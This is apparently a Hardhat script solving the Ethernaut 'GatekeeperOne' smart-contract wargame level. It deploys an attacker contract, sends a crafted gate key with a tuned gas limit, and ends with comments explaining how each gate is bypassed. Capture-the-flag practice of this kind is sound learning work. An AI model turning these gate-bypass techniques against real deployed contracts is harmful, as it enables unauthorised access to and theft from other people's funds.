import { artifacts, ethers } from "hardhat";
import { deployContract } from "../../utils/deployContract";
import { abi } from "../../artifacts/contracts/13.GatekeeperOne/GatekeeperOne.sol/GatekeeperOne.json";
import { BigNumber, Contract, providers } from "ethers";
import { displayEthBalance } from "../../utils/displayEthBalance";
import { SignerWithAddress } from "@nomiclabs/hardhat-ethers/signers";
import { callbackify, TextDecoder } from "util";

function setTargetContract() {
  const contractAddress = "0xa62475328C7ded61380Dba84C2B9986FB72D6FfF";
  return new Contract(contractAddress, abi);
}

async function checkSucces(attacker: SignerWithAddress, target: Contract) {
  const entrant = await target.connect(attacker).entrant();
  console.log(entrant);
  console.log("Success: ", BigNumber.from(attacker.address).eq(entrant));
}

async function main() {
  const [attacker] = await ethers.getSigners();
  const gpo = setTargetContract();
  // await deployContract("GatekeeperOne");
  const ContactFactory = await ethers.getContractFactory(
    "GatekeeperOneAttacker",
    attacker
  );
  const gpoa = await ContactFactory.deploy(gpo.address);
  await gpoa.deployed();
  const tx = await gpoa.attack([1, 0, 0, 0, 0, 0, 157, 217], {
    gasLimit: "300000",
  });
  await tx.wait();
  checkSucces(attacker, gpo);
}

main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});

// Explanation:
// gateOne: do the attack though a smartcontract.
// gateTwo: do the attack using the low level code call() and specify the amount
// of gas you want to provide. Indentify the amount to send using console.log,
// make sure to send enough.
// gateThree:
//   part1: make sure that bytes 4 and 5 are 0
//   part2: make sure either bytes 0,1,2 or 3 are != 0
//   part3: put tx.origin / 255 at byte 6 and tx.origin % 255 at byte 7
